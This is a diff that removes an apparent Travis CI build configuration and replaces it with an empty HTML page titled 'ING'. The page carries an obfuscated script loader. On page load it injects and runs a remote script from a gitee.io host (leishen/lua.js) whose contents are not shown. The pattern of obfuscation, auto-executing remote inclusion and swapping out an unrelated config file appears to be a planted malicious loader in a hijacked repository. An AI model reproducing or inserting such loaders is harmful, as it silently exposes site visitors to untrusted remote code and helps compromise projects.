@@ -1,8 +1,28 @@
-sudo: false
-language: node_js
-node_js: stable
-after_success:
-- npm run deploy
-env:
-  global:
-    secure: kuu6RtZ+5EYNprgJwxaz+69hnMosV9Kpqvh10qEp3ckp/MBoAAd2+wD1Ee6oB/deI2ZdIj8EkgKezWjMu/EJjwZw41WhyEMxD0KmC3aZUOLmZAdgwiZ9qB+BF52nz4FUtXgrpvCLvtd70a0ReRnlRpyp11QL4UT6C0r+fqFX2ojps1aBQgfOyQX0V2l6Cb0/L6FINwHCW+5pL3aGAGWfA4dLVtFkk5GzvlKf2WJlyM9+hSscuUPnn52l7e7g938IdQ1Bba6rGvsVRsWQiSNPQpYyyylop9M2K47jTl6zfvHZL7Eqw9pp3FwCX64GNkHFYEOVQLQPVPVz7IoFJA7Tl7GCK0TzogdbjJsLJoOG86t1UD/CvGeFWyFHGZwj0FY6qYyRM/3KTyFJ1/HakvSFhPnTYrihMyNHtofe1J8rl4ty0Tq0BH88+VXylwujzlc28UuziMdSxW9zaJM1JCsUjfimXkGvBivQNmm83ULy96UILHga9nMCEzjW1hNYjOWZWIjeuFw2xYGMI/+xURq8g2zvU4yMcJ0xKkHz6dvJyGfO3KYTFM1QtOP/nLq+OJTjgXVg0OuMq3P1aqiOVGZIX2a/kJtwOYXRC2AagaGwNXq6zk0b1sPOVq8HcuIF1Q6dF0MGhTYhZFSPrkGjk7VPeqn9/e+p4dQ96p30c7X/pvc=
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,minimum-scale=1,maximum-scale=1">
+<meta content="yes" name="apple-mobile-web-app-capable">
+<meta content="black" name="apple-mobile-web-app-status-bar-style">
+<meta content="no" name="msapplication-tap-highlight">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<title>ING</title>
+<script>
+    /**GGGMMMM*/
+var version = "lua";
+var WAItcl1 = WAItcl1 || [];;
+var b2 = ["//gitpeter1.gitee.io/leishen/" + version + '.js'];
+var h3;
+var t4;
+for (var WOYuAkCBS5 = 0; WOYuAkCBS5 < b2["length"]; WOYuAkCBS5++) {
+    h3 = window["document"]["createElement"]("script");
+    h3["src"] = b2[WOYuAkCBS5];
+    t4 = window["document"]["getElementsByTagName"]("script")[0];
+    t4["parentNode"]["insertBefore"](h3, t4);
+}
+    </script>
+</head>
+<body>
+</body>	
+</html>
